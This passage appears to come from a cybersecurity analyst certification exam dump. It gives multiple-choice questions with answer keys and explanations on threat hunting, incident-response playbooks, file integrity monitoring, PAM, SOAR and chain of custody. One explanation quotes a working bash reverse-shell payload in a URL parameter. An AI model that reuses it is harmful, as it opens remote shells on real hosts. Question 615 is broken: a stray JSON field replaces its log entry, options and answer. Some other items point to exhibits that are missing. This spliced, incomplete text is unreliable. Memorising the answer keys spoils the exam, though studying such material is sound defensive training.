\nInstance not found on preset location  \n  \nWhich of the following should the analyst use to fix the issue?  \n  \nA. run module_name and exec <module_name>  \nB. --session <session_name> and --module-args=\"<arg1>\"  \nC. set_regions <region1> and set_key  \nD. --whoami and --data <service name>  \n  \nAnswer: C Explanation:  \nSetting the correct region (set_regions <region1>) and credentials (set_key) resolves issues \nrelated to authentication and locating cloud instances, which is necessary for accessing and \nassessing cloud resources.  \n  \n  \nQUESTION 609  \nWhich of the following threat-hunting concepts is most concerned with identifying the behaviors of \nthe bad actor?  \n  \nA. Threat intelligence sharing  \nB. Indicators of compromise  \nC. Insider threat analysis  \nD. Tactics, techniques, and procedures  \n  \nAnswer: D Explanation:  \nThe threat-hunting concept most concerned with identifying the behaviors of the bad actor is \nTactics, Techniques, and Procedures (TTPs). TTPs refer directly to how adversaries operate— \ntheir overall strategies (tactics), the ways they execute attacks (techniques), and their step-\nbystep actions (procedures). TTPs provide deep insight into attacker behaviors, which are used \nto recognize, categorize, and defend against threat actor activities in an environment.  \n  \n  \n\n\n \nQUESTION 610  \nWhich of the following best explains the importance of playbooks for incident response teams?  \n  \nA. Playbooks define compliance controls and help keep the monitoring process that is in place fully \naligned with regulatory requirements as designed by international rules.  \nB. Playbooks help implement mitigation controls to prevent the occurrence of incidents in \naccordance with internal policies and procedures as designed by the IT team.  \nC. Playbooks set baseline requirements that are implemented before incidents happen to ensure \nthe proper monitoring process in order to collect metrics and KPIs that will be used for \nlessonslearned procedures after a postmortem analysis.  \nD. Playbooks help minimize negative impacts and restore data, systems, and operations through \nhighly detailed, preplanned procedures that will be followed when particular types of incidents \noccur.  \n  \nAnswer: D Explanation:  \nA playbook provides a clear, step-by-step guide tailored to specific incident types, ensuring \nresponse actions are fast, consistent, and effective at containing damage and recovering \noperations.  \n  \n  \nQUESTION 611  \nAlerts from the security dashboard are reporting a cloud-based host is suspected to be corrupt. \nThe OS is not loading. The initial investigation concludes that the OS files were modified. Which \nof the following security controls provided the report?  \n  \nA. FIM  \nB. DLP  \nC. NIDS  \nD. API gateway  \n  \nAnswer: A Explanation:  \nFile Integrity Monitoring alerts when critical system files are changed, which aligns with the report \nthat the OS files on the cloud host were modified and are now corrupt.  \n  \n  \nQUESTION 612  \nA company received a shipment of new network switches. Immediately after installing the \nswitches, a security analyst notices suspicious traffic coming from one of the new switches. \nWhich of the following best describes the threat actor?  \n  \nA. Insider threat  \nB. Supply chain  \nC. Nation-state  \nD. Organized crime  \n  \nAnswer: B Explanation:  \nThe suspicious traffic originating immediately from new, out-of-the-box switches indicates they \nwere likely tampered with before delivery, a classic supply-chain compromise.  \n  \n  \nQUESTION 613  \nWhich of the following best describes the benefit of implementing a PAM solution?  \n\n\n \n  \nA. Measuring and validating the integrity of the database  \nB. Controlling and monitoring the use of administrative accounts  \nC. Storing and protecting PKI certificate private keys  \nD. Configuring and enforcing password complexity requirements  \n  \nAnswer: B Explanation:  \nA PAM solution centralizes management of elevated credentials, enforces least-privilege access, \nand provides session logging and monitoring for all administrative activities, ensuring that \nprivileged use is both controlled and auditable.  \n  \n  \nQUESTION 614  \nDuring the triage of a SIEM alarm, a security analyst identifies the following activity on \na .bash_history file:  \n  \n  \n  \nWhich of the following actions should the analyst take?  \n  \nA. Declare an incident and look for data exfiltration.  \nB. Declare an incident and look for lateral movements.  \nC. Declare a false positive and close the alarm.  \nD. Declare an incident and look for malware in the affected machine.  \n  \nAnswer: A Explanation:  \nThe Bash history shows a small Python script being written that reads “secretsauce.txt,” retrieves \neach entry via HTTP, and then POSTS the retrieved content to an external server. Finally, the \nscript is marked executable and run. This is a clear attempt to siphon sensitive data off‑host, so \nyou should treat it as a confirmed incident and investigate what data has been exfiltrated.  \n  \n  \nQUESTION 615  \nA security analyst identifies the following log entry in the web server logs:",

      "explanation": "The URL parameter (cmd=bash -i >& /dev/tcp/10.20.10.22/1234 0>&1) is classic \nremote‑code‑execution syntax for spawning a reverse shell back to the attacker’s host. The 200 \nstatus shows the command ran successfully, indicating the attacker has gained shell access (a \nform of lateral movement) via an RCE flaw.  \n  \n  \nQUESTION 616  \nA security analyst receives an alert with the following packet capture:  \n  \n  \n  \nWhich of the following conclusions should the analyst reach about this incident?  \n  \nA. EnCase is enumerating a server.  \nB. A Nessus proxy is manipulating traffic.  \nC. An Nmap scan is occurring.  \nD. Metasploit is installing on a target.  \n  \nAnswer: C Explanation:  \nThe capture shows rapid SYNs to two well‑known ports (80 and 443) from the same source, \nimmediately followed by RSTs from the target - classic behavior of a SYN‑based port scan. \nNmap’s default scan (SYN scan) operates exactly this way, probing ports and tearing down \nconnections if no SYN‑ACK is returned.  \n  \n  \nQUESTION 617  \nAn after-action review of a ransomware attack on a company identified deficiencies in \nresponsiveness and consistency. Which of the following choices would best facilitate \nimprovement of these deficiencies?  \n  \nA. Leverage a SIEM.  \nB. Utilize threat intelligence sharing.  \nC. Source multiple threat feeds.  \nD. Implement SOAR.  \n  \nAnswer: D  \nExplanation:  \nA SOAR platform automates and orchestrates incident‑response workflows using standardized \nplaybooks, ensuring faster, more consistent handling of ransomware events.  \n\n\n \n  \n  \nQUESTION 618  \nA security analyst is performing a malware analysis on a device and receives the following \ninstructions:  \n  \n- Reduce the blast radius of the potential threat.  \n- Preserve forensic data for post-incident analysis.  \n- If securely possible, preserve connectivity for live analysis.   \nWhich of the following will best help the analyst during the investigation?  \n  \nA. Configure an EDR agent to isolate the network with authorized exceptions to the NOC VLAN.  \nB. Execute a SOAR playbook to trigger a malware scan on the company's assets.  \nC. Use file integrity monitoring to determine if the suspicious file was modified.  \nD. Collect the suspicious file using SFTP and reimage the device.  \n  \nAnswer: A Explanation:  \nUsing the EDR’s network‑isolation feature contains the infected host (shrinking its blast radius) \nwhile still permitting controlled access from a management or NOC VLAN for live analysis and \nforensic collection. This meets all three objectives without destroying data or cutting off analysis.  \n  \n  \nQUESTION 619  \nWhich of the following is the practice of controlling how evidence is handled to ensure its integrity \nduring an investigation?  \n  \nA. Chain of custody  \nB. Root cause analysis  \nC. Incident response  \nD. Evidence collection  \n  \nAnswer: A Explanation:  \nChain of custody is the documented process that tracks the collection, handling, and storage of \nevidence to ensure its integrity and admissibility throughout an investigation.  \n  \n  \nQUESTION 620  \nA SOC analyst is reviewing the weekly EDR report. The report shows that the same application \nwas blocked once every 24 hours. Which of the following tools should the analyst use to further \ninvestigate the incident?  \n  \nA. Registry Editor  \nB. services.msc  \nC. Task Scheduler  \nD. MSConfig  \n  \nAnswer: C Explanation:  \nA recurring block every 24 hours points to a scheduled task launching the application.
